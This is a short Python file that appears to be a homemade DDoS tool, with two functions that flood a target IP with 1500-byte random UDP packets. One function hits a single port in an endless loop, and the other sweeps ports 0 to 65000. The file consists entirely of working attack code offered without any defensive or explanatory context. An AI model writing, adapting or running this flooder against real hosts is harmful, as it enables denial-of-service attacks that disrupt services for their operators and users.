import socket
import random
import time
import threading



def main_ddos_loop_static(port,end_ip):
	print("called a function")
	print(port,end_ip)
	socket1 = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
	bytes = random._urandom(1500)
	while True:
		socket1.sendto(bytes,(end_ip,int(port)))
		print(f"Sent Packets to {end_ip} Random Port: {port}")




def main_ddos_loop_random(end_ip):
	print("called a function")
	socket1 = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
	bytes = random._urandom(1500)

	for index, port in enumerate(range(0,65000)):
		socket1.sendto(bytes,(end_ip,port))
		print(f"[{index}] Sent Packets to {end_ip} Random Port: {port}")
